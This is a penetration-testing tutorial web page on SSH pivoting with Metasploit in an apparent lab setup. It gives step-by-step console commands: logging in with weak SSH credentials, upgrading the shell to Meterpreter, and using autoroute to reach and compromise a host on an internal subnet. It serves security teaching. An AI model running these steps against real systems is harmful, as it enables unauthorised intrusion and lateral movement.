<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
            <h1 class="post-title entry-title">SSH Pivoting using Meterpreter</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ssh-pivoting-using-meterpreter/" rel="bookmark"><time class="entry-date published" datetime="2017-08-14T16:30:18+00:00">August 14, 2017</time><time class="updated" datetime="2025-06-02T05:44:20+00:00">June 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">If you are aware of SSH tunneling then you can easily understand SSH pivoting, if not then don’t worry read SSH tunneling from <a href="https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/"><strong>here</strong></a>.   </span></p>
<h3 class="ai-optimize-31" data-start="137" data-end="189"><span style="color: #800000;">Establishing Initial Access via SSH Login</span></h3>
<p class="ai-optimize-7"><span style="color: #000000;"><strong>Pivoting</strong> is a technique to get inside an unreachable network with the help of a pivot (center point). In simple words, it is an attack through which an attacker can exploit a system that belongs to a different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network, and then the attacker will able to target the client system for the attack.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-cYra6fZLKPA/Wc9AJJBSyrI/AAAAAAAARuI/lEBrXV6j1boVWTMXvtHf24zm6lgYnz8TgCLcBGAs/s1600/ssh.png"/></p>
<p> </p>
<p class="ai-optimize-8"><span style="color: #000000;">This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database. This module will record successful logins and hosts so you can track your access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) &gt; set rhosts 192.168.0.109
msf auxiliary(ssh_login) &gt; set username raj
msf auxiliary(ssh_login) &gt; set password 123
msf auxiliary(ssh_login) &gt; exploit</pre>
<p class="ai-optimize-9"><span style="color: #000000;">From the given image you can observe that command shell <strong>session 1</strong> opened</span></p>
<p class="ai-optimize-10"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RGpwRHda6Jc/WZHOludI1cI/AAAAAAAAQ4U/0JQ2pyFRVUc4ILV-LkGRju7VV9VPjoSKACLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-11"><span style="color: #000000;">Now convert command shell into the meterpreter shell through the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions –u 1</pre>
<p class="ai-optimize-12"><span style="color: #000000;">From the given image you can observe that <strong>Meterpreter session 2</strong> opened</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions</pre>
<p class="ai-optimize-13"><span style="color: #000000;"><strong> </strong>Hence, if you count, then the current attacker holds 2 sessions. <strong>1<sup>st</sup></strong> for the <strong>command shell</strong> and <strong>2<sup>nd</sup></strong> for <strong>the meterpreter shell</strong> of the SSH server.</span></p>
<p class="ai-optimize-14"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ISwbDHS6e9o/WZHOlnaF57I/AAAAAAAAQ4Y/3IIB2OgY_bwh8soBnkwrHiXIldXAVPpmgCLcBGAs/s1600/2.png"/></span></p>
<h3 class="ai-optimize-32"><span style="color: #800000;">Using Autoroute for Internal Network Pivoting</span></h3>
<p class="ai-optimize-15"><span style="color: #000000;">Check network interface using <strong>ifconfig</strong> command.</span></p>
<p class="ai-optimize-16"><span style="color: #000000;">From the given image, you can observe two network interfaces in the victim’s system, <strong>1<sup>st</sup> </strong>for IP <strong>192.168.0.109. </strong>Through which the attacker is connected, and <strong>2<sup>nd</sup></strong> for IP <strong>192.168.10.1</strong> through which the SSH client (targets) is connected.</span></p>
<p class="ai-optimize-17"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LV1_xBZ4Xo4/WZHOmpxbv2I/AAAAAAAAQ4g/6uui7OIF14UxqxhYOeDlDTDNuIjU-HLhgCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-18"><span style="color: #000000;">Since the attacker belongs to <strong>192.168.0.1</strong> interface and client belongs to <strong>192.168.10.0</strong> interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.10.0 network attacker need to run the <strong>post exploitation</strong> “autoroute”.</span></p>
<p class="ai-optimize-19"><span style="color: #000000;">This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use post/multi/manage/autoroute 
msf post(autoroute) &gt; set subnet 192.168.10.0
msf post(autoroute) &gt; set session 2
msf post(autoroute) &gt; exploit</pre>
<p class="ai-optimize-20"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZkbWiQab364/WZHOm8ga0CI/AAAAAAAAQ4k/izvzlWYh4kk1inSEkKg5XeB2ovv6OP11gCLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-33"><span style="color: #800000;">Gaining Access to the Internal SSH Client</span></h3>
<p class="ai-optimize-21"><span style="color: #000000;">This time, we are exploiting <strong>SSH Ignite</strong> (local client). Therefore, we are going to use the same module for it that had used above for SSH raj, only need to change the information inside the exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) &gt; set rhosts 192.168.10.2
msf auxiliary(ssh_login) &gt; set username ignite
msf auxiliary(ssh_login) &gt; set password 1234
msf auxiliary(ssh_login) &gt; exploit</pre>
<p class="ai-optimize-22"><span style="color: #000000;"><strong> </strong>From the given image, you can see another <strong>command shell 3 </strong>opened if you count; then the total attack holds 3 sessions, two for the SSH server and one for the SSH client.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions</pre>
<ol>
<li class="ai-optimize-23"><span style="color: #000000;">Command shell for SSH raj (192.168.0.109:22)</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">Meterpreter shell for SSH raj (192.168.0.109)</span></li>
<li class="ai-optimize-25"><span style="color: #000000;">Command shell for SSH ignite (192.168.10.2:22)</span></li>
</ol>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m965kFVb2tc/WZHOm4e21mI/AAAAAAAAQ4o/Zy4CZmFc7YUOku3smI6OaLFWgsYddsuQACLcBGAs/s1600/5.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 3</pre>
<p class="ai-optimize-27"><span style="color: #000000;">Now attacker is command shell of SSH ignite (client), let’s verify through network configuration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ifconfig</pre>
<p class="ai-optimize-28"><span style="color: #000000;">From given, you can observe the network IP is<strong> 192.168.10.2</strong></span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pVy8akd3lpk/WZHOnQg8g0I/AAAAAAAAQ4s/lJ6SaYWb13w_mzRxJYOzIxy12N6dOHgSQCLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
